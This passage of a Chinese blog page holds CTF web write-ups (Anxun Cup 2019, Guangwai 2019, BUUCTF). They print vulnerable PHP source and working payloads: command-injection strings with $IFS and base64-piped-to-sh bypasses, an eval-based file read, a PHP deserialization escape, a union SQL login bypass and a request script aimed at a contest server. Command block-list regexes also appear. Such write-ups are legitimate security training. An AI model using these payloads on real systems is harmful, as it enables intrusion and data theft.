@@ -1,0 +1,1285 @@
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      2019安洵杯+2019广外比赛web部分题解 | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《2019安洵杯+2019广外比赛web部分题解》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" itemprop="url">
+		2019安洵杯+2019广外比赛web部分题解
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" itemprop="url">
+		<time datetime="2019-12-01T14:55:04.000Z" itemprop="datePublished">
+	  		2019-12-01
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" itemprop="url">
+		<time datetime="2019-12-01T14:55:04.000Z" itemprop="dateUpdated">
+	  		2020-01-25
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/_visitors" data-url="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" data-title="2019安洵杯+2019广外比赛web部分题解">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/_likes" data-url="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" data-title="2019安洵杯+2019广外比赛web部分题解" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="2019安洵杯"><a href="#2019安洵杯" class="headerlink" title="2019安洵杯"></a>2019安洵杯</h2><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>知识点：<strong>MD5强碰撞，命令执行</strong><br>这个题比较简单，看题目发现传入参数img和cmd，然而图片是传入的img参数控制，让我想到ddctf的一道题，然后发现img是通过把文件名进行转十六进制后两次base64编码，来把图片读出，这样，我们把index.php也进行上述编码，传入img,成功读出img源码：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
+
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '&lt;img src ="./ctf3.jpeg">';
+    die("xixi～ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "&lt;img src='data:image/gif;base64," . $txt . "'>&lt;/img>";
+    echo "&lt;br>";
+}
+echo $cmd;
+echo "&lt;br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "&lt;br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+
+?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
+  <span class="token selector">body</span><span class="token punctuation">{</span>
+   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url">url(./bj.png)</span>  no-repeat center center<span class="token punctuation">;</span>
+   <span class="token property">background-size</span><span class="token punctuation">:</span>cover<span class="token punctuation">;</span>
+   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
+   <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#CCCCCC</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后构造payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+
+url='http://47.108.135.45:20166/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ta\c%20/flag'
+str5=open('./out_test_003.txt','rb').read()
+str6=open('./out_test_001.txt','rb').read()
+
+print str5
+data= {
+  'a':str5,
+  'b':str6
+}
+
+res= requests.post(url=url,data=data)
+print res.content
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h3><p>知识点：<strong>变量覆盖，预包含，反序列化中的对象逃逸</strong><br>直接给出源码：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$function = @$_GET['f'];
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+if($_SESSION){
+    unset($_SESSION);
+}
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+extract($_POST);
+if(!$function){
+    echo '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php?f<span class="token punctuation">=</span>highlight_file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>source_code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>';
+}
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+$serialize_info = filter(serialize($_SESSION));
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行phpinfo(），我们发现有预加载文件d0g3_f1ag.php，所以就读d0g3_f1ag.php。<br>发现函数<code>extract($_POST)</code>很明显是个变量覆盖漏洞。再往下找，有<code>file_get_contents</code>函数读取。但是我们发现这个变量被sha1函数加密了。没办法利用，但是，有<code>serialize</code>和<code>unserialize</code>函数，并且中间有一层过滤，把匹配到的字符替换成空。<br>注意：任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</p>
+<pre class="line-numbers language-html"><code class="language-html">function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&amp;function=show_image
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里我令_SESSION[user]为flagflagflagflagflagflag，正常情况下序列化后的数据是这样的：</p>
+<pre class="line-numbers language-html"><code class="language-html">a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>而经过了过滤函数之后，序列化的数据就会变成这样：</p>
+<pre class="line-numbers language-html"><code class="language-html">a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到，user的内容长度依旧为24，但是已经没有内容了，所以反序列化时会自动往后读取24位:<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code><br>然后会读取到的位置，<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}</code>然后结束，由于user的序列化内容读取数据时需要往后填充24位，导致后面function的内容也发生了改变，吞掉了其双引号，导致我们可以控制后面的序列化内容。</p>
+<p>而php反序列化时，当一整段内容反序列化结束后，后面的非法字符将会被忽略，而如何判断是否结束呢，可以看到，前面有一个a:3，表示序列化的内容是一个数组，有三个键，而以{作为序列化内容的起点，}作为序列化内容的终点。</p>
+<p>所以此时后面的<code>&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;}</code>在反序列化时就会被当作非法字符忽略掉，导致我们可以控制$userinfo[“img”]的值，达到任意文件读取的效果。</p>
+<p>在读取完<code>d0g3_f1ag.php</code>后，得到下一个hint，获取到flag文件名，此时修改payload读根目录下的flag即可。</p>
+<h2 id="2019广东外语外贸大学第三届网络安全大赛"><a href="#2019广东外语外贸大学第三届网络安全大赛" class="headerlink" title="2019广东外语外贸大学第三届网络安全大赛"></a>2019广东外语外贸大学第三届网络安全大赛</h2><h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>知识点：<strong>php伪随机数</strong><br>进入check.php给出了源码：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+#这不是抽奖程序的源代码！不许看！
+header("Content-Type: text/html;charset=utf-8");
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i &lt; $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>p1<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>".$str_show."<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>";
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){
+        echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>flag</span><span class="token punctuation">></span></span>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>";
+    }
+    else{
+        echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>flag</span><span class="token punctuation">></span></span>没抽中哦，再试试吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>";
+    }
+}
+show_source("check.php"); 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里用到了<code>php_mt_rand</code>,这里的坑点是php版本问题。php7和php5不太一样。<br>给出payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+str2='7bwSK3x5Sg'
+length = len(str2)
+res=''
+for i in range(len(str2)):
+    for j in range(len(str1)):
+        if str2[i] == str1[j]:
+            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
+            break
+
+print res
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参考链接：<a href="https://xz.aliyun.com/t/3656" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656</a></p>
+<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>知识点：<strong>phpmyadmin4.8.1漏洞</strong><br>题目给了一个phpinfo.php,和phpmyadmin<br>存在本地任意文件包含漏洞<br>参考：<a href="https://www.cnblogs.com/bmjoker/p/9897436.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9897436.html</a><br>成功getshell。<br>最让我不能忍的是他flag就在根目录flag，内容是flag{123456789}，这竟然是真flag。。。根本不用getshell。浪费好多时间，我<em>**</em>.</p>
+<p>现在在做buuctf,碰见当时做过的题目，这里来写写总结，记录下来。</p>
+<h3 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h3><p>知识点：<strong>git泄露，rce</strong></p>
+<p>发现git泄露，代码审计。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+include "flag.php";
+echo "flag在哪里呢？&lt;br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个题以前见过，也总结过。先说一种方法吧：<br>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合<code>pos</code>或者<code>current</code>能得到.，也就是当前目录，然后再加上scandir就能获取当前目录的所有的文件，输出出来可以得到当前文件夹下的内容。<br><img src="https://s2.ax1x.com/2020/01/23/1VAkGR.png" alt="1VAkGR.png"><br>然后观察flag.php的位置，发现它在倒数第二位，可以用<code>array_reverse</code>逆转数组，然后用next函数读第二个元素，这样我们就可以读flag.php。<br>故payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">readfile(next(array_reverse(scandir(pos(localeconv())))));
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>方法二：<br>思路大多都相同，就是获取当前目录的方式不同。<br>首先，通过phpversion()函数获取当前php的版本号，然后通过crypt()函数加密得到一串字符串，即任意字符，然后通过hebrevc()或hebrev()来处理一下，我们会发现，它的首字母可能是$或.,然后通过ord()函数，然后通过chr()函数，可能得到.。然后剩下的就和方法一一样了。这里我在看别人的writeup时后，突然发现，<code>highlight_file</code>函数，也可以显示文件啊。<br>payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>知识点：<strong>命令执行</strong><br>让你传ip,然后去执行ping 你的ip。通常用<code>|</code>或<code>;</code>或<code>&amp;</code>。来添加你要执行的命令。构造<br><code>127.0.0.1|ls</code>。ls成功执行。并发现flag.php。然后就是读flag了。经过测试，过滤了空格和flag关键字，也过滤了<code>?*</code>等通配符，这里介绍几种绕过方式。空格都知道用<code>$IFS$9</code>来绕过，但是flag关键字如何绕呢？<br>这里我先直接给出过滤的源码，然后再详细介绍三种方法。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+if(isset($_GET['ip'])){
+  $ip = $_GET['ip'];
+  if(preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
+    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
+    die("fxck your symbol!");
+  } else if(preg_match("/ /", $ip)){
+    die("fxck your space!");
+  } else if(preg_match("/bash/", $ip)){
+    die("fxck your bash!");
+  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+    die("fxck your flag!");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  echo "&lt;pre>";
+  print_r($a);
+}
+
+?></span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>方法一：<br>因为ls命令直接可以直接获得flag.php文件名，所以我们可以直接构造<br>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">127.0.0.1|cat$IFS$9`ls`
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>方法二：<br>仔细观察过滤，我们发现不能输入同时按照flag字母顺序的字符串，<br>我们可以使用调用linux环境变量的方法去拼接字符串。先输出<code>$PATH</code>：</p>
+<pre class="line-numbers language-html"><code class="language-html">127.0.0.1|echo$IFS$9$PATH
+得到：
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>里面含有我们要的l和a用cut截取出来去替换他们即可：</p>
+<pre class="line-numbers language-html"><code class="language-html">127.0.0.1|echo$IFS$9$PATH|cut$IFS$9-c6
+得到
+l
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后构造payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">127.0.0.1|cat$IFS$9f`echo$IFS$9$PATH|cut$IFS$9-c6`ag.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>方法三：<br> 利用管道符+base64 编码 即可绕过<br>首先，通过base64编码把执行的命令<code>cat flag.php</code>编码一下得到<code>Y2F0IGZsYWcucGhw</code>，然后通过<code>base64 -d</code>解码，得到命令再用bash或用sh来执行就行。<br>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">127.0.0.1|echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h3><p>知识点：<strong>联合注入绕过登陆</strong><br>这个题过滤了括号和or，想注出数据有点困难，但是测试发现可以报错，也可以联合注入。这里利用union自行构造一个密码，通常数据库的信息都是MD5加密的数据，所以我们可以把我们输入的密码，进行MD5加密。用联合注入，使查询数据的时候，查出我们想要的数据。<br>sql语句是：<code>select * from user where username = &#39;$name&#39;</code>。<br>利用union后：<br><code>select * from user where username =&#39;-1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&#39;</code>我们就可以查询出，密码是为1，用户名叫admin的一个用户。（1的MD5值为c4ca4238a0b923820dcc509a6f75849b）。所以我们的payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">name=0' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&amp;pw=1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h3><p>知识点：<strong>弱口令，文件包含，文件上传</strong><br>首先，这个题绝对是个出题事故。来说说解法。<br>题目说是绝对防御，那就是弱口令了。爆出密码：password.登陆上之后，来看看题，文件上传，发现参数?file=upload,直接<code>php://filter/read=convert.base64-encode/resource=</code>读源码，得到源码：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> 
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    上传文件
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
